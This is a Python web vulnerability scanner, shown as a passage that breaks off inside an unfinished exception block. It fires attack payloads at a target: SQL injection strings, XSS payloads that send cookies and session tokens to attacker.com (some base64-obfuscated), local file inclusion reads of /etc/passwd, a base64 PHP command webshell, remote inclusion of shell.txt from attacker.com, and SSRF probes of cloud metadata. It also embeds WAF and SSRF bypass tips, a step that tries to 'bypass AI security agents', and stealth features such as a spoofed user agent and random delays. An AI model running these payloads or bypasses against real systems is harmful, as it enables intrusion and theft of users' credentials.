import asyncio
import concurrent.futures
import http.client
import json
import os
import re
import socket
import ssl
import sys
import urllib.parse
import random
import time
import base64
import hashlib
import requests
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple, Union
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class VulnerabilityScanner:
    def __init__(self, target: str, username: str = None, password: str = None, cookies: Dict = None):
        self.target = target
        self.username = username
        self.password = password
        self.cookies = cookies or {}
        self.session = requests.Session()
        self.vulnerabilities = []
        self.stop_scan = False
        self.discovered_paths = set()
        self.discovered_params = set()
        self.severity_weights = {
            "CRITICAL": 100,
            "HIGH": 80,
            "MEDIUM": 60,
            "LOW": 40,
            "INFO": 20
        }
        self.scan_results = {
            "target": target,
            "scan_time": datetime.now().isoformat(),
            "vulnerabilities": [],
            "summary": {
                "critical": 0,
                "high": 0,
                "medium": 0,
                "low": 0,
                "info": 0,
                "ai_agents_detected": False,
                "ai_bypass_attempted": False,
                "ai_bypass_result": None
            },
            "risk_score": 0,
            "scan_details": {
                "paths_discovered": [],
                "parameters_discovered": [],
                "authentication_status": "Not attempted",
                "scan_duration": None,
                "total_requests": 0,
                "successful_requests": 0,
                "failed_requests": 0,
                "scan_status": "Not started",
                "scan_depth": "standard"
            }
        }
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        self.console = Console()
        self.start_time = datetime.now()
        print(f"Initializing scanner for target: {target}")

    def _discover_paths_and_params(self):
        """Discover all possible paths and parameters"""
        print("Discovering paths and parameters...")
        self.scan_results["scan_details"]["scan_status"] = "Discovering paths and parameters"
        
        # Common paths to check
        common_paths = [
            "/", "/admin", "/login", "/register", "/api", "/api/v1", "/api/v2",
            "/user", "/profile", "/search", "/contact", "/about", "/blog",
            "/wp-admin", "/wp-login", "/phpmyadmin", "/adminer", "/manager",
            "/console", "/server-status", "/.git", "/.env", "/config",
            "/backup", "/uploads", "/images", "/assets", "/static"
        ]
        
        # Common parameters to check
        common_params = [
            "id", "user", "username", "email", "password", "search", "q",
            "file", "path", "page", "include", "load", "cmd", "command",
            "exec", "run", "system", "redirect", "url", "next", "return",
            "return_to", "token", "session", "auth", "key", "secret"
        ]
        
        # Track visited paths to avoid duplicates
        visited_paths = set()
        
        for path in common_paths:
            if self.stop_scan:
                self.scan_results["scan_details"]["scan_status"] = "Stopped"
                print("Scan stopped by user")
                return
                
            try:
                if path in visited_paths:
                    continue
                    
                visited_paths.add(path)
                time.sleep(random.uniform(0.5, 2.0))
                url = urllib.parse.urljoin(self.target, path)
                print(f"Checking path: {path}")
                
                self.scan_results["scan_details"]["total_requests"] += 1
                
                try:
                    response = self.session.get(url, headers=self.headers, cookies=self.cookies, timeout=10)
                    
                    # Consider any response with status code < 500 as successful
                    if response.status_code < 500:
                        self.scan_results["scan_details"]["successful_requests"] += 1
                        
                        if response.status_code in [200, 301, 302, 403]:
                            self.discovered_paths.add(path)
                            if path not in self.scan_results["scan_details"]["paths_discovered"]:
                                self.scan_results["scan_details"]["paths_discovered"].append(path)
                            print(f"Discovered path: {path}")
                            
                            # Extract parameters from response
                            for param in common_params:
                                if self.stop_scan:
                                    self.scan_results["scan_details"]["scan_status"] = "Stopped"
                                    return
                                    
                                if f'name="{param}"' in response.text or f"name='{param}'" in response.text:
                                    self.discovered_params.add(param)
                                    if param not in self.scan_results["scan_details"]["parameters_discovered"]:
                                        self.scan_results["scan_details"]["parameters_discovered"].append(param)
                                    print(f"Discovered parameter: {param}")
                                    
                            # Check for directory listing
                            if "Index of /" in response.text:
                                self._add_vulnerability(
                                    "Directory Listing Enabled",
                                    f"Directory listing is enabled at {url}",
                                    "MEDIUM"
                                )
                                
                            # Extract and check additional paths from HTML
                            self._extract_paths_from_html(response.text)
                    else:
                        self.scan_results["scan_details"]["failed_requests"] += 1
                        
                except requests.RequestException:
                    self.scan_results["scan_details"]["failed_requests"] += 1
                    
            except Exception as e:
                print(f"Error discovering path {path}: {str(e)}")
                self.scan_results["scan_details"]["failed_requests"] += 1
                continue

    def scan(self):
        """Main scan orchestrator"""
        print("Starting deep scan...")
        self.start_time = datetime.now()
        self.scan_results["scan_details"]["scan_status"] = "Running"
        
        try:
            if self._is_url(self.target):
                print("Target identified as URL, starting deep web scan...")
                
                # Check for AI security agents
                print("Checking for AI security agents...")
                ai_agents_detected = self._detect_ai_agents(self.target)
                
                if ai_agents_detected:
                    print("AI security agents detected. Attempting bypass...")
                    bypass_result = self._bypass_ai_protection(self.target)
                    self.scan_results["summary"]["ai_bypass_attempted"] = True
                    self.scan_results["summary"]["ai_bypass_result"] = bypass_result["message"]
                
                self._deep_web_scan()
            elif self._is_ip(self.target):
                print("Target identified as IP, starting deep network scan...")
                self._deep_network_scan()
            elif os.path.exists(self.target):
                print("Target identified as file/directory, starting deep code scan...")
                self._deep_code_scan()
            else:
                print(f"Error: Invalid target format: {self.target}")
                raise ValueError("Invalid target format")
        except Exception as e:
            self.scan_results["scan_details"]["scan_status"] = "Error"
            self.scan_results["scan_details"]["error_message"] = str(e)
            print(f"Scan error: {str(e)}")
            raise e
        finally:
            # Update scan duration
            end_time = datetime.now()
            duration = end_time - self.start_time
            self.scan_results["scan_details"]["scan_duration"] = str(duration)
            # Only update status if not already set to Error and not stopped by user
            if self.stop_scan:
                self.scan_results["scan_details"]["scan_status"] = "Stopped"
            elif self.scan_results["scan_details"]["scan_status"] != "Error":
                self.scan_results["scan_details"]["scan_status"] = "Completed"
            # Add last update timestamp
            self.scan_results["scan_details"]["last_update"] = datetime.now().isoformat()
            print(f"Deep scan completed with status: {self.scan_results['scan_details']['scan_status']}!")

    def authenticate(self):
        """Attempt to authenticate if credentials are provided"""
        if not self.username or not self.password:
            self.scan_results["scan_details"]["authentication_status"] = "No credentials provided"
            return False

        print("Attempting authentication...")
        self.scan_results["scan_details"]["authentication_status"] = "Attempting authentication"
        
        login_urls = [
            f"{self.target}/login",
            f"{self.target}/admin",
            f"{self.target}/auth",
            f"{self.target}/signin"
        ]

        for url in login_urls:
            try:
                self.scan_results["scan_details"]["total_requests"] += 1
                
                # Try common login parameter names
                login_data = {
                    'username': self.username,
                    'password': self.password,
                    'user': self.username,
                    'pass': self.password,
                    'email': self.username,
                    'login': self.username,
                    'pwd': self.password
                }

                response = self.session.post(url, data=login_data, headers=self.headers, timeout=10)
                if response.status_code in [200, 302, 303]:
                    self.scan_results["scan_details"]["successful_requests"] += 1
                    # Check if we got a session cookie
                    if self.session.cookies:
                        self.cookies = dict(self.session.cookies)
                        self._add_vulnerability(
                            "Authentication Success",
                            f"Successfully authenticated to {url}",
                            "INFO"
                        )
                        self.scan_results["scan_details"]["authentication_status"] = "Successfully authenticated"
                        return True
                else:
                    self.scan_results["scan_details"]["failed_requests"] += 1
            except Exception as e:
                print(f"Authentication attempt failed for {url}: {str(e)}")
                self.scan_results["scan_details"]["failed_requests"] += 1
                continue

        self.scan_results["scan_details"]["authentication_status"] = "Authentication failed"
        return False

    def _is_url(self, target: str) -> bool:
        """Check if target is a valid URL"""
        try:
            result = urllib.parse.urlparse(target)
            is_valid = all([result.scheme, result.netloc])
            print(f"URL validation result: {is_valid}")
            return is_valid
        except Exception as e:
            print(f"URL validation error: {str(e)}")
            return False

    def _is_ip(self, target: str) -> bool:
        """Check if target is a valid IP address"""
        try:
            socket.inet_aton(target)
            print(f"IP validation result: True")
            return True
        except Exception as e:
            print(f"IP validation error: {str(e)}")
            return False

    def _extract_paths_from_html(self, html_content: str):
        """Extract and check additional paths from HTML content"""
        try:
            # Extract href and src attributes
            href_pattern = r'href=[\'"]([^\'"]+)[\'"]'
            src_pattern = r'src=[\'"]([^\'"]+)[\'"]'
            
            paths = set()
            
            # Find all href and src attributes
            paths.update(re.findall(href_pattern, html_content))
            paths.update(re.findall(src_pattern, html_content))
            
            base_url = urllib.parse.urlparse(self.target)
            
            for path in paths:
                if self.stop_scan:
                    return
                    
                try:
                    # Parse the URL
                    parsed = urllib.parse.urlparse(path)
                    
                    # Skip external links and non-HTTP(S) schemes
                    if parsed.netloc and parsed.netloc != base_url.netloc:
                        continue
                    if parsed.scheme and parsed.scheme not in ['http', 'https']:
                        continue
                        
                    # Extract the path component
                    clean_path = parsed.path
                    if not clean_path:
                        continue
                        
                    # Skip already discovered paths
                    if clean_path in self.discovered_paths:
                        continue
                        
                    # Add to discovered paths for checking
                    if clean_path not in self.scan_results["scan_details"]["paths_discovered"]:
                        self.discovered_paths.add(clean_path)
                        self.scan_results["scan_details"]["paths_discovered"].append(clean_path)
                        print(f"Discovered new path from HTML: {clean_path}")
                except Exception as e:
                    print(f"Error processing path {path}: {str(e)}")
                    continue
                    
        except Exception as e:
            print(f"Error extracting paths from HTML: {str(e)}")
            return

    def _deep_web_scan(self):
        """Enhanced deep web application vulnerability scanner"""
        print("Starting enhanced deep web vulnerability checks...")
        self.scan_results["scan_details"]["scan_status"] = "Running enhanced web vulnerability checks"
        self.scan_results["scan_details"]["scan_depth"] = "enhanced"
        
        try:
            # First discover all possible paths and parameters
            self._discover_paths_and_params()
            
            if self.stop_scan:
                return
            
            # Create a copy of discovered paths
            paths_to_scan = self.discovered_paths.copy()
            
            # Perform enhanced vulnerability checks for each path
            for path in paths_to_scan:
                if self.stop_scan:
                    return
                    
                full_url = urllib.parse.urljoin(self.target, path)
                
                # Advanced SQL Injection Check
                self._check_advanced_sql_injection(full_url)
                if self.stop_scan: return
                
                # Advanced XSS Check
                self._check_advanced_xss(full_url)
                if self.stop_scan: return
                
                # Advanced File Inclusion Check
                self._check_advanced_file_inclusion(full_url)
                if self.stop_scan: return
                
                # Original checks
                self._check_open_redirect(full_url)
                if self.stop_scan: return
                
                self._check_directory_traversal(full_url)
                if self.stop_scan: return
                
                self._check_sensitive_files(full_url)
                if self.stop_scan: return
                
                self._check_security_headers(full_url)
                if self.stop_scan: return

                # New vulnerability checks
                self._check_crypto_implementation(full_url)
                if self.stop_scan: return

                self._check_component_versions()
                if self.stop_scan: return

                self._check_logging_monitoring()
                if self.stop_scan: return

                self._check_ssrf_vulnerabilities(full_url)
                if self.stop_scan: return
                
                # Check for any newly discovered paths
                if len(self.discovered_paths) > len(paths_to_scan):
                    new_paths = self.discovered_paths - paths_to_scan
                    paths_to_scan.update(new_paths)
                    print(f"Found {len(new_paths)} new paths to scan")
                
            print("Enhanced deep web vulnerability checks completed")
            
        except Exception as e:
            print(f"Error during enhanced web scan: {str(e)}")
            self.scan_results["scan_details"]["scan_status"] = "Error"
            raise e

    def _check_advanced_sql_injection(self, url):
        """Advanced SQL injection checks including blind and time-based"""
        print(f"Performing advanced SQL injection checks for: {url}")
        
        # Advanced SQL injection patterns
        blind_payloads = [
            ("' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1--", "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 1/0 END)=1--"),
            ("' AND (SELECT CASE WHEN (SUBSTRING(@@version,1,1)='5') THEN 1 ELSE 1/0 END)=1--", ""),
            ("' AND (SELECT CASE WHEN (DATABASE() LIKE '%') THEN 1 ELSE 1/0 END)=1--", "")
        ]
        
        time_payloads = [
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "'; SELECT SLEEP(5)--",
            "' pg_sleep(5)--"
        ]
        
        union_payloads = [
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT NULL,NULL--",
            "' UNION ALL SELECT @@version,NULL--",
            "' UNION ALL SELECT table_name,NULL FROM information_schema.tables--"
        ]
        
        bypass_techniques = """
        SQL Injection Bypass Techniques:
        1. Use encoding to bypass WAF filters: Convert payloads to hex/URL encoding
        2. Use alternate SQL syntax: Replace OR with || and AND with &&
        3. Use comments to break up SQL keywords: SEL/**/ECT instead of SELECT
        4. Use case variation: UnIoN SeLeCt instead of UNION SELECT
        5. Use whitespace alternatives: TAB, carriage return, or line feed instead of spaces
        6. Use SQL CHAR() function: CHAR(49) instead of '1'
        7. Use mathematical operations: '1'+'1' instead of '11'
        """
        
        remediation = """
        SQL Injection Remediation Steps:
        1. Use parameterized queries/prepared statements instead of string concatenation
        2. Implement input validation and sanitization
        3. Apply the principle of least privilege to database accounts
        4. Use stored procedures with proper parameter handling
        5. Implement a WAF with SQL injection protection rules
        6. Keep database systems and applications updated with security patches
        7. Use ORM frameworks that handle SQL escaping automatically
        """
        
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param_name in params.keys():
            if self.stop_scan:
                return
            
            # Test blind SQL injection
            for true_payload, false_payload in blind_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [true_payload]
                    
                    true_url = urllib.parse.urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        urllib.parse.urlencode(test_params, doseq=True),
                        parsed.fragment
                    ))
                    
                    self.scan_results["scan_details"]["total_requests"] += 1
                    true_response = self.session.get(true_url, headers=self.headers, timeout=10)
                    
                    if true_response.status_code < 500:
                        self.scan_results["scan_details"]["successful_requests"] += 1
                    else:
                        self.scan_results["scan_details"]["failed_requests"] += 1
                        continue
                    
                    if false_payload:
                        test_params[param_name] = [false_payload]
                        false_url = urllib.parse.urlunparse((
                            parsed.scheme,
                            parsed.netloc,
                            parsed.path,
                            parsed.params,
                            urllib.parse.urlencode(test_params, doseq=True),
                            parsed.fragment
                        ))
                        
                        self.scan_results["scan_details"]["total_requests"] += 1
                        false_response = self.session.get(false_url, headers=self.headers, timeout=10)
                        
                        if false_response.status_code < 500:
                            self.scan_results["scan_details"]["successful_requests"] += 1
                        else:
                            self.scan_results["scan_details"]["failed_requests"] += 1
                            continue
                        
                        if true_response.text != false_response.text:
                            self._add_vulnerability(
                                "Blind SQL Injection",
                                f"Blind SQL injection vulnerability detected at {url} in parameter {param_name}",
                                "CRITICAL",
                                evidence=f"Different responses detected between true and false conditions",
                                remediation=remediation,
                                bypass_techniques=bypass_techniques
                            )
                            return
                            
                except Exception as e:
                    print(f"Error in blind SQL injection check: {str(e)}")
                    self.scan_results["scan_details"]["failed_requests"] += 1
            
            # Test time-based SQL injection
            for payload in time_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        urllib.parse.urlencode(test_params, doseq=True),
                        parsed.fragment
                    ))
                    
                    self.scan_results["scan_details"]["total_requests"] += 1
                    start_time = time.time()
                    response = self.session.get(test_url, headers=self.headers, timeout=10)
                    
                    if response.status_code < 500:
                        self.scan_results["scan_details"]["successful_requests"] += 1
                    else:
                        self.scan_results["scan_details"]["failed_requests"] += 1
                        continue
                    
                    response_time = time.time() - start_time
                    
                    if response_time >= 5:
                        self._add_vulnerability(
                            "Time-Based SQL Injection",
                            f"Time-based SQL injection vulnerability detected at {url} in parameter {param_name}",
                            "CRITICAL",
                            evidence=f"Response delayed by {response_time:.2f} seconds with payload: {payload}",
                            remediation=remediation,
                            bypass_techniques=bypass_techniques
                        )
                        return
                        
                except Exception as e:
                    print(f"Error in time-based SQL injection check: {str(e)}")
                    self.scan_results["scan_details"]["failed_requests"] += 1

    def _check_advanced_xss(self, url):
        """Advanced XSS checks including DOM-based and stored XSS"""
        print(f"Performing advanced XSS checks for: {url}")
        
        dom_xss_payloads = [
            "<img src=x onerror=this.src='http://attacker.com/?cookie='+document.cookie>",
            "<svg onload=fetch('http://attacker.com/?'+document.cookie)>",
            "<script>new Image().src='http://attacker.com/?'+document.cookie;</script>",
            "<body onload=fetch('http://attacker.com/?'+localStorage.getItem('session'))>",
            "<img src=x onerror=\"eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vPycrZG9jdW1lbnQuY29va2llKQ=='))\">",
            "<svg><script>alert(document.domain)</script>",
            "<iframe srcdoc=\"<img src=x onerror=alert(parent.document.cookie)>\">",
            "<link rel=import href=\"data:text/html,<script>alert(document.domain)</script>\">"
        ]
        
        stored_xss_payloads = [
            "<script>new Function(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))()</script>",
            "<img src=x onerror=\"setTimeout(()=>{fetch('http://attacker.com/?'+document.cookie)},1000)\">",
            "<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>",
            "<form><button formaction=javascript:alert(document.domain)>click",
            "<input onfocus=alert(document.domain) autofocus>",
            "<video><source onerror=alert(document.domain)>"
        ]
        
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param_name in params.keys():
            if self.stop_scan:
                return
            
            # Test DOM-based XSS
            for payload in dom_xss_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        urllib.parse.urlencode(test_params, doseq=True),
                        parsed.fragment
                    ))
                    
                    response = self.session.get(test_url, headers=self.headers, timeout=10)
                    
                    if payload.lower() in response.text.lower():
                        if re.search(f"<script[^>]*>{re.escape(payload)}</script>", response.text, re.I) or \
                           re.search(f"on\\w+\\s*=\\s*['\"].*{re.escape(payload)}.*['\"]", response.text, re.I):
                            self._add_vulnerability(
                                "DOM-Based XSS",
                                f"DOM-based XSS vulnerability detected at {url} in parameter {param_name}",
                                "CRITICAL",
                                evidence=f"Payload successfully injected: {payload}",
                                remediation="Implement proper output encoding and CSP headers"
                            )
                            return
                            
                except Exception as e:
                    print(f"Error in DOM-based XSS check: {str(e)}")
            
            # Test stored XSS
            for payload in stored_xss_payloads:
                try:
                    # First request to store the payload
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    store_url = urllib.parse.urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        urllib.parse.urlencode(test_params, doseq=True),
                        parsed.fragment
                    ))
                    
                    self.session.post(store_url, headers=self.headers, timeout=10)
                    
                    # Second request to check if payload was stored
                    response = self.session.get(url, headers=self.headers, timeout=10)
                    
                    if payload.lower() in response.text.lower():
                        self._add_vulnerability(
                            "Stored XSS",
                            f"Stored XSS vulnerability detected at {url} in parameter {param_name}",
                            "CRITICAL",
                            evidence=f"Stored payload found in response: {payload}",
                            remediation="Implement proper input validation and output encoding"
                        )
                        return
                        
                except Exception as e:
                    print(f"Error in stored XSS check: {str(e)}")

    def _check_ssrf_vulnerabilities(self, url):
        """Check for SSRF vulnerabilities"""
        print(f"Checking SSRF vulnerabilities for: {url}")
        
        # Test URLs for SSRF
        test_urls = [
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/',  # GCP metadata
            'http://127.0.0.1/',  # localhost
            'http://localhost/',
            'http://0.0.0.0/',
            'http://[::1]/',  # IPv6 localhost
            'http://internal-service/',
            'file:///etc/passwd',
            'dict://',  # gopher protocol
            'gopher://internal-service:1234/'
        ]
        
        # Parameters commonly vulnerable to SSRF
        ssrf_params = ['url', 'path', 'uri', 'proxy', 'dest', 'redirect', 'webhook', 'callback', 'resource']
        
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param in ssrf_params:
            if self.stop_scan:
                return
                
            if param in params:
                for test_url in test_urls:
                    try:
                        test_params = params.copy()
                        test_params[param] = [test_url]
                        
                        test_url = urllib.parse.urlunparse((
                            parsed.scheme,
                            parsed.netloc,
                            parsed.path,
                            parsed.params,
                            urllib.parse.urlencode(test_params, doseq=True),
                            parsed.fragment
                        ))
                        
                        self.scan_results["scan_details"]["total_requests"] += 1
                        
                        # Use a short timeout to avoid hanging
                        response = self.session.get(test_url, headers=self.headers, timeout=3)
                        
                        bypass_techniques = """
                        SSRF Bypass Techniques:
                        1. Use alternate IP representations: Decimal, Octal, or Hexadecimal notation
                        2. Use DNS rebinding: Create a domain that initially resolves to an allowed IP, then changes to internal IP
                        3. Use URL encoding/double encoding: http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
                        4. Use IPv6 address: [::1] instead of 127.0.0.1
                        5. Use HTTPS URLs when only HTTP is blocked
                        6. Use redirects from trusted domains
                        7. Use non-standard ports for services
                        8. Use alternate URL schemas: gopher://, file://, dict://, etc.
                        9. Use cloud metadata endpoints with subdomain bypass: metadata.instance.com.attacker.com
                        """
                        
                        remediation = """
                        SSRF Remediation Steps:
                        1. Implement a whitelist of allowed domains and IPs
                        2. Disable unused URL schemas/protocols
                        3. Use a dedicated service/proxy for remote resource access
                        4. Implement network segmentation to restrict access to internal resources
                        5. Use cloud provider security features to restrict metadata access
                        6. Validate and sanitize all user-supplied URLs
                        7. Implement DNS rebinding protections
                        8. Use a WAF with SSRF protection rules
                        9. Avoid using user-supplied input in file/URL operations
                        """
                        
                        # Check for successful responses or metadata content
                        if response.status_code == 200:
                            if 'ami-id' in response.text or 'instance-id' in response.text:
                                self._add_vulnerability(
                                    "SSRF - Cloud Metadata Access",
                                    f"SSRF vulnerability allowing access to cloud metadata via parameter {param}",
                                    "CRITICAL",
                                    evidence=f"Successful metadata access: {test_url}",
                                    bypass_techniques=bypass_techniques,
                                    remediation=remediation
                                )
                                return
                            elif 'root:' in response.text or 'passwd' in response.text:
                                self._add_vulnerability(
                                    "SSRF - Local File Access",
                                    f"SSRF vulnerability allowing local file access via parameter {param}",
                                    "CRITICAL",
                                    evidence=f"Local file content accessed: {test_url}",
                                    bypass_techniques=bypass_techniques,
                                    remediation=remediation
                                )
                                return
                            elif 'internal' in response.text.lower():
                                self._add_vulnerability(
                                    "SSRF - Internal Service Access",
                                    f"SSRF vulnerability allowing internal service access via parameter {param}",
                                    "HIGH",
                                    evidence=f"Internal service content accessed: {test_url}",
                                    bypass_techniques=bypass_techniques,
                                    remediation=remediation
                                )
                                return
                                
                        self.scan_results["scan_details"]["successful_requests"] += 1
                    except requests.exceptions.Timeout:
                        # Timeout might indicate successful SSRF attempt
                        bypass_techniques = """
                        SSRF Bypass Techniques:
                        1. Use alternate IP representations: Decimal, Octal, or Hexadecimal notation
                        2. Use DNS rebinding: Create a domain that initially resolves to an allowed IP, then changes to internal IP
                        3. Use URL encoding/double encoding: http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
                        4. Use IPv6 address: [::1] instead of 127.0.0.1
                        5. Use HTTPS URLs when only HTTP is blocked
                        6. Use redirects from trusted domains
                        7. Use non-standard ports for services
                        8. Use alternate URL schemas: gopher://, file://, dict://, etc.
                        9. Use cloud metadata endpoints with subdomain bypass: metadata.instance.com.attacker.com
                        """
                        
                        remediation = """
                        SSRF Remediation Steps:
                        1. Implement a whitelist of allowed domains and IPs
                        2. Disable unused URL schemas/protocols
                        3. Use a dedicated service/proxy for remote resource access
                        4. Implement network segmentation to restrict access to internal resources
                        5. Use cloud provider security features to restrict metadata access
                        6. Validate and sanitize all user-supplied URLs
                        7. Implement DNS rebinding protections
                        8. Use a WAF with SSRF protection rules
                        9. Avoid using user-supplied input in file/URL operations
                        """
                        
                        self._add_vulnerability(
                            "Potential SSRF",
                            f"Potential SSRF vulnerability detected via timeout in parameter {param}",
                            "MEDIUM",
                            evidence=f"Request timeout with payload: {test_url}",
                            bypass_techniques=bypass_techniques,
                            remediation=remediation
                        )
                    except Exception as e:
                        self.scan_results["scan_details"]["failed_requests"] += 1
                        print(f"Error in SSRF check: {str(e)}")
        
        # Check for DNS rebinding vulnerability
        try:
            # Make two quick requests to check if DNS resolution is cached
            test_domain = 'ssrf-test.com'
            test_url = f'http://{test_domain}/test'
            
            self.session.get(test_url, timeout=2)
            time.sleep(1)
            self.session.get(test_url, timeout=2)
            
            bypass_techniques = """
            SSRF Bypass Techniques:
            1. Use alternate IP representations: Decimal, Octal, or Hexadecimal notation
            2. Use DNS rebinding: Create a domain that initially resolves to an allowed IP, then changes to internal IP
            3. Use URL encoding/double encoding: http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
            4. Use IPv6 address: [::1] instead of 127.0.0.1
            5. Use HTTPS URLs when only HTTP is blocked
            6. Use redirects from trusted domains
            7. Use non-standard ports for services
            8. Use alternate URL schemas: gopher://, file://, dict://, etc.
            9. Use cloud metadata endpoints with subdomain bypass: metadata.instance.com.attacker.com
            """
            
            remediation = """
            SSRF Remediation Steps:
            1. Implement a whitelist of allowed domains and IPs
            2. Disable unused URL schemas/protocols
            3. Use a dedicated service/proxy for remote resource access
            4. Implement network segmentation to restrict access to internal resources
            5. Use cloud provider security features to restrict metadata access
            6. Validate and sanitize all user-supplied URLs
            7. Implement DNS rebinding protections
            8. Use a WAF with SSRF protection rules
            9. Avoid using user-supplied input in file/URL operations
            """
            
            self._add_vulnerability(
                "Potential DNS Rebinding Vulnerability",
                "Application may be vulnerable to DNS rebinding attacks",
                "HIGH",
                evidence="Multiple DNS resolutions allowed for same domain",
                bypass_techniques=bypass_techniques,
                remediation=remediation
            )
        except Exception:
            pass

    def _check_advanced_file_inclusion(self, url):
        """Check for advanced file inclusion vulnerabilities"""
        print(f"Checking advanced file inclusion for: {url}")
        
        lfi_payloads = [
            "../../../../etc/passwd%00",
            "....//....//....//....//etc/passwd",
            "../../../../../../../../../../etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://id"
        ]
        
        rfi_payloads = [
            "http://attacker.com/shell.txt",
            "https://attacker.com/shell.txt%00",
            "\\\\attacker.com\\share\\shell.txt",
            "//attacker.com/shell.txt",
            "http://127.0.0.1/shell.txt",
            "ftp://attacker.com/shell.txt"
        ]
        
        file_patterns = [
            r"root:.*:0:0:",  # Unix passwd file
            r"\[boot loader\]",  # Windows boot.ini
            r"<?php",  # PHP source code
            r"HTTP_USER_AGENT",  # PHP environment
            r"DOCUMENT_ROOT",  # Web server config
            r"database\.php",  # Database config files
            r"config\.php"  # Application config files
        ]
        
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param_name in params.keys():
            if self.stop_scan:
                return
            
            # Test Local File Inclusion
            for payload in lfi_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        urllib.parse.urlencode(test_params, doseq=True),
                        parsed.fragment
                    ))
                    
                    response = self.session.get(test_url, headers=self.headers, timeout=10)
                    
                    for pattern in file_patterns:
                        if re.search(pattern, response.text):
                            self._add_vulnerability(
                                "Local File Inclusion",
                                f"Local File Inclusion vulnerability detected at {url} in parameter {param_name}",
                                "CRITICAL",
                                evidence=f"File content pattern matched: {pattern}",
                                remediation="Implement proper input validation and restrict file access"
                            )
                            return
                            
                except Exception as e:
                    print(f"Error in LFI check: {str(e)}")
            
            # Test Remote File Inclusion
            for payload in rfi_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        urllib.parse.urlencode(test_params, doseq=True),
                        parsed.fragment
                    ))
                    
                    response = self.session.get(test_url, headers=self.headers, timeout=10)
                    
                    if "<?php" in response.text or "shell" in response.text.lower():
                        self._add_vulnerability(
                            "Remote File Inclusion",
                            f"Remote File Inclusion vulnerability detected at {url} in parameter {param_name}",
                            "CRITICAL",
                            evidence=f"Possible remote file inclusion with payload: {payload}",
                            remediation="Disable allow_url_include and implement proper input validation"
                        )
                        return
                        
                except Exception as e:
                    print(f"Error in RFI check: {str(e)}")

    def _check_component_versions(self):
        """Check for vulnerable and outdated components"""
        print("Checking for vulnerable components...")
        
        try:
            # Common package files to check
            package_files = [
                'package.json',
                'requirements.txt',
                'composer.json',
                'pom.xml',
                'build.gradle'
            ]
            
            base_url = urllib.parse.urljoin(self.target, '/')
            
            for file in package_files:
                if self.stop_scan:
                    return
                    
                try:
                    test_url = urllib.parse.urljoin(base_url, file)
                    self.scan_results["scan_details"]["total_requests"] += 1
                    
                    response = self.session.get(test_url, headers=self.headers, timeout=10)
                    
                    if response.status_code == 200:
                        # Parse different package file formats
                        if file == 'package.json':
                            data = response.json()
                            dependencies = {**data.get('dependencies', {}), **data.get('devDependencies', {})}
                            for package, version in dependencies.items():
                                self._check_npm_vulnerability(package, version)
                                
                        elif file == 'requirements.txt':
                            for line in response.text.splitlines():
                                if '==' in line:
                                    package, version = line.split('==')
                                    self._check_python_vulnerability(package, version)
                                    
                        elif file == 'composer.json':
                            data = response.json()
                            dependencies = {**data.get('require', {}), **data.get('require-dev', {})}
                            for package, version in dependencies.items():
                                self._check_composer_vulnerability(package, version)
                                
                        self.scan_results["scan_details"]["successful_requests"] += 1
                    else:
                        self.scan_results["scan_details"]["failed_requests"] += 1
                        
                except Exception as e:
                    print(f"Error checking {file}: {str(e)}")
                    self.scan_results["scan_details"]["failed_requests"] += 1
                    continue
                    
        except Exception as e:
